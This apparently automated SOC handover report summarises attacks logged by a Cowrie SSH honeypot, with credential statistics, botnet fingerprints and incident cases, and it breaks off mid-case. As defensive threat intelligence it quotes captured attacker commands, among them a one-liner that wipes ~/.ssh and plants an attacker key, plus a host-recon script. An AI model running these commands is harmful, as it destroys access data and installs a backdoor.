# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-02 |
| **Generated At** | 2026-07-02T19:37:33Z |
| **Shift Time** | 19:37 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **115** |
| Confirmed Threats | **108** |
| False Positives Filtered | **7** (6.1%) |
| Unique Attacker IPs | **37** |
| Countries of Origin | **14** |
| High Severity Cases | **74** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **41** |
| Malware Samples Analyzed | **3** HIGH · **38** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **93** |
| Unique Credential Pairs | **61** |
| Unique Usernames | **12** |
| Unique Passwords | **54** |
| Successful Auth Pairs | **81** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 58 |
| `345gs5662d34` | 14 |
| `pinger` | 6 |
| `ubuntu` | 4 |
| `testuser1` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 14 |
| `3245gs5662d34` | 14 |
| `123456` | 3 |
| `12345678` | 3 |
| `123456789` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 14 |
| `root` | `3245gs5662d34` | 8 |
| `pinger` | `pinger` | 3 |
| `pinger` | `3245gs5662d34` | 3 |
| `root` | `QWERT!@#$%` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `usuario` | `babygirl` | `45.205.1.42` | 2026-07-02T16:55:52 |
| `root` | `12345` | `92.118.39.50` | 2026-07-02T16:56:19 |
| `root` | `1234567` | `92.118.39.50` | 2026-07-02T16:59:49 |
| `root` | `12345678` | `92.118.39.50` | 2026-07-02T17:01:40 |
| `nagios` | `iloveu` | `45.198.224.120` | 2026-07-02T17:01:50 |
| `root` | `123456789` | `92.118.39.50` | 2026-07-02T17:03:40 |
| `root` | `1q2w3e4r5` | `185.242.3.195` | 2026-07-02T17:04:58 |
| `root` | `1234abcd` | `92.118.39.50` | 2026-07-02T17:06:01 |
| `root` | `123abc` | `92.118.39.50` | 2026-07-02T17:08:39 |
| `root` | `1q2w3e4r5` | `10.0.0.73` | 2026-07-02T17:08:40 |
| `root` | `P@ssword!001` | `45.205.1.42` | 2026-07-02T17:09:51 |
| `root` | `123qwe` | `92.118.39.50` | 2026-07-02T17:11:42 |
| `root` | `password007` | `103.176.20.115` | 2026-07-02T17:13:04 |
| `345gs5662d34` | `345gs5662d34` | `103.176.20.115` | 2026-07-02T17:13:08 |
| `root` | `3245gs5662d34` | `103.176.20.115` | 2026-07-02T17:13:10 |
| `ubuntu` | `qwertyuiop` | `45.198.224.120` | 2026-07-02T17:13:31 |
| `root` | `nagios123` | `165.154.200.48` | 2026-07-02T17:14:13 |
| `345gs5662d34` | `345gs5662d34` | `165.154.200.48` | 2026-07-02T17:14:17 |
| `root` | `3245gs5662d34` | `165.154.200.48` | 2026-07-02T17:14:19 |
| `root` | `1q2w3e` | `92.118.39.50` | 2026-07-02T17:15:10 |
| `root` | `qq11..` | `41.242.115.83` | 2026-07-02T17:16:26 |
| `345gs5662d34` | `345gs5662d34` | `41.242.115.83` | 2026-07-02T17:16:30 |
| `root` | `3245gs5662d34` | `41.242.115.83` | 2026-07-02T17:16:31 |
| `root` | `1q2w3e4r` | `92.118.39.50` | 2026-07-02T17:19:15 |
| `testuser1` | `test` | `209.141.47.217` | 2026-07-02T17:20:29 |
| `345gs5662d34` | `345gs5662d34` | `209.141.47.217` | 2026-07-02T17:20:31 |
| `testuser1` | `3245gs5662d34` | `209.141.47.217` | 2026-07-02T17:20:32 |
| `root` | `Dubai@123` | `220.127.148.6` | 2026-07-02T17:21:17 |
| `345gs5662d34` | `345gs5662d34` | `220.127.148.6` | 2026-07-02T17:21:21 |
| `root` | `3245gs5662d34` | `220.127.148.6` | 2026-07-02T17:21:22 |
| `root` | `pass2003` | `103.239.252.132` | 2026-07-02T17:21:34 |
| `345gs5662d34` | `345gs5662d34` | `103.239.252.132` | 2026-07-02T17:21:38 |
| `root` | `3245gs5662d34` | `103.239.252.132` | 2026-07-02T17:21:40 |
| `root` | `5t4r3e2w1q` | `45.205.1.42` | 2026-07-02T17:23:55 |
| `root` | `1qaz2wsx` | `92.118.39.50` | 2026-07-02T17:23:57 |
| `steam` | `123456789` | `45.198.224.120` | 2026-07-02T17:25:25 |
| `odoo` | `12345678` | `113.164.66.10` | 2026-07-02T17:28:08 |
| `345gs5662d34` | `345gs5662d34` | `113.164.66.10` | 2026-07-02T17:28:12 |
| `odoo` | `3245gs5662d34` | `113.164.66.10` | 2026-07-02T17:28:14 |
| `root` | `321` | `92.118.39.50` | 2026-07-02T17:29:09 |
| `root` | `orangepi` | `211.253.31.30` | 2026-07-02T17:32:12 |
| `345gs5662d34` | `345gs5662d34` | `211.253.31.30` | 2026-07-02T17:32:15 |
| `root` | `3245gs5662d34` | `211.253.31.30` | 2026-07-02T17:32:17 |
| `root` | `Pass1234` | `45.198.224.120` | 2026-07-02T17:37:03 |
| `ubuntu` | `asdf123456` | `45.205.1.42` | 2026-07-02T17:37:53 |
| `pinger` | `pinger` | `10.0.0.73` | 2026-07-02T17:39:07 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-02T17:39:13 |
| `pinger` | `3245gs5662d34` | `10.0.0.73` | 2026-07-02T17:39:16 |
| `root` | `111111` | `195.178.110.227` | 2026-07-02T17:46:10 |
| `root` | `123123` | `195.178.110.227` | 2026-07-02T17:47:57 |
| `root` | `aaaaaa` | `45.198.224.120` | 2026-07-02T17:48:34 |
| `root` | `1234` | `195.178.110.227` | 2026-07-02T17:49:58 |
| `andy` | `123456` | `45.205.1.42` | 2026-07-02T17:51:53 |
| `root` | `12345` | `195.178.110.227` | 2026-07-02T17:52:32 |
| `root` | `` | `141.11.88.119` | 2026-07-02T17:52:42 |
| `whale` | `whale123` | `10.0.0.73` | 2026-07-02T17:54:48 |
| `whale` | `3245gs5662d34` | `10.0.0.73` | 2026-07-02T17:54:54 |
| `root` | `12345678` | `195.178.110.227` | 2026-07-02T17:56:25 |
| `root` | `123456789` | `195.178.110.227` | 2026-07-02T17:58:29 |
| `root` | `Qwe!@#456` | `203.205.37.233` | 2026-07-02T17:59:22 |
| `345gs5662d34` | `345gs5662d34` | `203.205.37.233` | 2026-07-02T17:59:27 |
| `root` | `3245gs5662d34` | `203.205.37.233` | 2026-07-02T17:59:29 |
| `root` | `QWERT!@#$%` | `185.242.3.195` | 2026-07-02T17:59:49 |
| `robin` | `robin` | `45.198.224.120` | 2026-07-02T18:00:03 |
| `root` | `Password1` | `195.178.110.227` | 2026-07-02T18:00:48 |
| `root` | `147852` | `45.205.1.42` | 2026-07-02T18:05:38 |
| `root` | `P@ssw0rd01` | `45.198.224.120` | 2026-07-02T18:11:38 |
| `root` | `admintelecom` | `45.205.1.42` | 2026-07-02T18:19:40 |
| `root` | `password` | `107.173.85.94` | 2026-07-02T18:19:57 |
| `root` | `741258` | `45.198.224.120` | 2026-07-02T18:23:10 |
| `root` | `russie` | `10.0.0.73` | 2026-07-02T18:31:00 |
| `ubuntu` | `BHNzMarxayzMDT7` | `45.205.1.42` | 2026-07-02T18:33:27 |
| `root` | `Pass@word123!@#` | `45.198.224.120` | 2026-07-02T18:34:43 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-02T18:38:44 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-02T18:38:45 |
| `root` | `QWERT!@#$%` | `10.0.0.73` | 2026-07-02T18:39:56 |
| `root` | `z@123456` | `101.47.156.21` | 2026-07-02T18:45:28 |
| `345gs5662d34` | `345gs5662d34` | `101.47.156.21` | 2026-07-02T18:45:32 |
| `root` | `3245gs5662d34` | `101.47.156.21` | 2026-07-02T18:45:34 |
| `ubuntu` | `abc1234567` | `45.198.224.120` | 2026-07-02T18:46:15 |
| `root` | `pokemon` | `45.205.1.42` | 2026-07-02T18:47:20 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **115** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 52 |
| libssh | 31 |
| Paramiko (Python) | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 31 | 11 |
| `16443846184e...` | Generic scanner | 22 | 3 |
| `2ec37a7cc8da...` | Mirai/variant | 20 | 2 |
| `1507069938cc...` | Modern SSH client | 2 | 1 |
| `a2de0f306611...` | Mirai/variant | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 31 | 11 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 22 | 3 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 20 | 2 | Mirai/variant |
| `95420f9d932d...` | Go SSH scanner | 8 | 3 | — |
| `1507069938cc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 2 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 18 | 2 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 10 | 10 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.50`, `195.178.110.227`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `141.11.88.119`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `203.205.37.233`, `220.127.148.6`, `41.242.115.83`, `209.141.47.217`, `211.253.31.30`, `165.154.200.48`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **37** |
| Unique ASNs | **29** |
| High-Risk ASNs | **27** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4811` | China Telecom (Group) | 3 | HIGH |
| `AS198364` | BANATSYNC SRL | 3 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS215925` | VPSVAULT.HOST LTD | 2 | HIGH |
| `AS48090` | TECHOFF SRV LIMITED | 2 | HIGH |
| `AS37613` | DOLPHIN TELECOMMUNICATION LIMITED | 1 | HIGH |
| `AS51396` | Pfcloud UG | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (74)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-1246cda29ce4

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 16:55 |
| **Last Seen** | 2026-07-02 16:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:55:50` | `cowrie.session.connect` |
| `2026-07-02 16:55:50` | `cowrie.client.version` |
| `2026-07-02 16:55:50` | `cowrie.client.kex` |
| `2026-07-02 16:55:52` | `cowrie.login.success` |
| `2026-07-02 16:55:53` | `cowrie.session.params` |
| `2026-07-02 16:55:53` | `cowrie.command.input` |
| `2026-07-02 16:55:53` | `cowrie.log.closed` |
| `2026-07-02 16:55:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cf2d2469d56

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-02 16:56 |
| **Last Seen** | 2026-07-02 16:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:56:17` | `cowrie.session.connect` |
| `2026-07-02 16:56:18` | `cowrie.client.version` |
| `2026-07-02 16:56:18` | `cowrie.client.kex` |
| `2026-07-02 16:56:19` | `cowrie.login.success` |
| `2026-07-02 16:56:21` | `cowrie.session.params` |
| `2026-07-02 16:56:21` | `cowrie.command.input` |
| `2026-07-02 16:56:21` | `cowrie.command.input` |
| `2026-07-02 16:56:21` | `cowrie.command.input` |
| `2026-07-02 16:56:21` | `cowrie.command.input` |
| `2026-07-02 16:56:21` | `cowrie.command.input` |
| `2026-07-02 16:56:21` | `cowrie.command.success` |
| `2026-07-02 16:56:21` | `cowrie.command.input` |
| `2026-07-02 16:56:21` | `cowrie.command.input` |
| `2026-07-02 16:56:21` | `cowrie.command.input` |
| `2026-07-02 16:56:21` | `cowrie.command.input` |
| `2026-07-02 16:56:21` | `cowrie.log.closed` |
| `2026-07-02 16:56:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f184da08222a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-02 16:59 |
| **Last Seen** | 2026-07-02 16:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:59:48` | `cowrie.session.connect` |
| `2026-07-02 16:59:48` | `cowrie.client.version` |
| `2026-07-02 16:59:48` | `cowrie.client.kex` |
| `2026-07-02 16:59:49` | `cowrie.login.success` |
| `2026-07-02 16:59:50` | `cowrie.session.params` |
| `2026-07-02 16:59:50` | `cowrie.command.input` |
| `2026-07-02 16:59:50` | `cowrie.command.input` |
| `2026-07-02 16:59:50` | `cowrie.command.input` |
| `2026-07-02 16:59:50` | `cowrie.command.input` |
| `2026-07-02 16:59:50` | `cowrie.command.input` |
| `2026-07-02 16:59:50` | `cowrie.command.success` |
| `2026-07-02 16:59:50` | `cowrie.command.input` |
| `2026-07-02 16:59:50` | `cowrie.command.input` |
| `2026-07-02 16:59:50` | `cowrie.command.input` |
| `2026-07-02 16:59:50` | `cowrie.command.input` |
| `2026-07-02 16:59:51` | `cowrie.log.closed` |
| `2026-07-02 16:59:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1d67e5e865d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-02 17:01 |
| **Last Seen** | 2026-07-02 17:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:01:39` | `cowrie.session.connect` |
| `2026-07-02 17:01:39` | `cowrie.client.version` |
| `2026-07-02 17:01:39` | `cowrie.client.kex` |
| `2026-07-02 17:01:40` | `cowrie.login.success` |
| `2026-07-02 17:01:41` | `cowrie.session.params` |
| `2026-07-02 17:01:41` | `cowrie.command.input` |
| `2026-07-02 17:01:41` | `cowrie.command.input` |
| `2026-07-02 17:01:41` | `cowrie.command.input` |
| `2026-07-02 17:01:41` | `cowrie.command.input` |
| `2026-07-02 17:01:41` | `cowrie.command.input` |
| `2026-07-02 17:01:41` | `cowrie.command.success` |
| `2026-07-02 17:01:41` | `cowrie.command.input` |
| `2026-07-02 17:01:41` | `cowrie.command.input` |
| `2026-07-02 17:01:41` | `cowrie.command.input` |
| `2026-07-02 17:01:41` | `cowrie.command.input` |
| `2026-07-02 17:01:41` | `cowrie.log.closed` |
| `2026-07-02 17:01:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ede016ff4d7b

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 17:01 |
| **Last Seen** | 2026-07-02 17:01 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:01:44` | `cowrie.session.connect` |
| `2026-07-02 17:01:45` | `cowrie.client.version` |
| `2026-07-02 17:01:45` | `cowrie.client.kex` |
| `2026-07-02 17:01:50` | `cowrie.login.success` |
| `2026-07-02 17:01:54` | `cowrie.session.params` |
| `2026-07-02 17:01:54` | `cowrie.command.input` |
| `2026-07-02 17:01:55` | `cowrie.log.closed` |
| `2026-07-02 17:01:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db437c6de023

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-02 17:03 |
| **Last Seen** | 2026-07-02 17:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:03:39` | `cowrie.session.connect` |
| `2026-07-02 17:03:39` | `cowrie.client.version` |
| `2026-07-02 17:03:40` | `cowrie.client.kex` |
| `2026-07-02 17:03:40` | `cowrie.login.success` |
| `2026-07-02 17:03:41` | `cowrie.session.params` |
| `2026-07-02 17:03:41` | `cowrie.command.input` |
| `2026-07-02 17:03:41` | `cowrie.command.input` |
| `2026-07-02 17:03:41` | `cowrie.command.input` |
| `2026-07-02 17:03:41` | `cowrie.command.input` |
| `2026-07-02 17:03:41` | `cowrie.command.input` |
| `2026-07-02 17:03:41` | `cowrie.command.success` |
| `2026-07-02 17:03:41` | `cowrie.command.input` |
| `2026-07-02 17:03:41` | `cowrie.command.input` |
| `2026-07-02 17:03:41` | `cowrie.command.input` |
| `2026-07-02 17:03:41` | `cowrie.command.input` |
| `2026-07-02 17:03:41` | `cowrie.log.closed` |
| `2026-07-02 17:03:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f477352ac62d

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-02 17:04 |
| **Last Seen** | 2026-07-02 17:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:04:57` | `cowrie.session.connect` |
| `2026-07-02 17:04:57` | `cowrie.client.version` |
| `2026-07-02 17:04:57` | `cowrie.client.kex` |
| `2026-07-02 17:04:58` | `cowrie.login.success` |
| `2026-07-02 17:04:58` | `cowrie.session.params` |
| `2026-07-02 17:04:58` | `cowrie.command.input` |
| `2026-07-02 17:04:58` | `cowrie.log.closed` |
| `2026-07-02 17:04:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33d4becc439e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-02 17:06 |
| **Last Seen** | 2026-07-02 17:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:06:01` | `cowrie.session.connect` |
| `2026-07-02 17:06:01` | `cowrie.client.version` |
| `2026-07-02 17:06:01` | `cowrie.client.kex` |
| `2026-07-02 17:06:01` | `cowrie.login.success` |
| `2026-07-02 17:06:02` | `cowrie.session.params` |
| `2026-07-02 17:06:02` | `cowrie.command.input` |
| `2026-07-02 17:06:02` | `cowrie.command.input` |
| `2026-07-02 17:06:02` | `cowrie.command.input` |
| `2026-07-02 17:06:02` | `cowrie.command.input` |
| `2026-07-02 17:06:02` | `cowrie.command.input` |
| `2026-07-02 17:06:02` | `cowrie.command.success` |
| `2026-07-02 17:06:02` | `cowrie.command.input` |
| `2026-07-02 17:06:02` | `cowrie.command.input` |
| `2026-07-02 17:06:02` | `cowrie.command.input` |
| `2026-07-02 17:06:02` | `cowrie.command.input` |
| `2026-07-02 17:06:03` | `cowrie.log.closed` |
| `2026-07-02 17:06:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41c1c1baad36

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-02 17:08 |
| **Last Seen** | 2026-07-02 17:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
